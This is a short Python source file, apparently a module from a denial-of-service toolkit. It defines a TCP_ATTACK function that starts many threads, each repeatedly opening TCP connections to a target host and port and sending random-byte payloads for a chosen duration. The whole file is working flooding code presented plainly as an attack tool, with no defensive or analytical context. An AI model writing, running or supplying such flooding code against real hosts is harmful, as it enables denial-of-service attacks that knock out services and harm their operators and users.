#!/usr/bin/env python3

import random
import time
import socket
from threading import Thread

def TCP_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False
	target_ip = target.split(":")[0]
	target_port = int(target.split(":")[1])

	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting TCP attack...")
	

	threads_list = []

	# TCP flood
	def tcp_flood():
		global FINISH

		while True:
			if FINISH:
				break
			
			# Create socket
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.connect((target_ip, target_port))
			except Exception as e:
				print(e)
				print("\033[1;31m"+"[-]"+"\033[0m"+" Failed to create TCP connection!")
				exit()

			# Send random payload
			try:
				for _ in range(16):
					payload = random._urandom(random.randint(1, 120))
					sock.send(payload)
			except Exception as e:
				print(e)
				time.sleep(0.25)
				continue
			else:
				print("\033[1;32m"+"[+]"+"\033[0m"+" TCP packet with size " + str(len(payload)) + " was sent!")

	# Start threads
	for thread in range(threads):
		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
		t = Thread(target = tcp_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("\033[1;77m"+"[i]"+"\033[0m"+" Attack completed.")
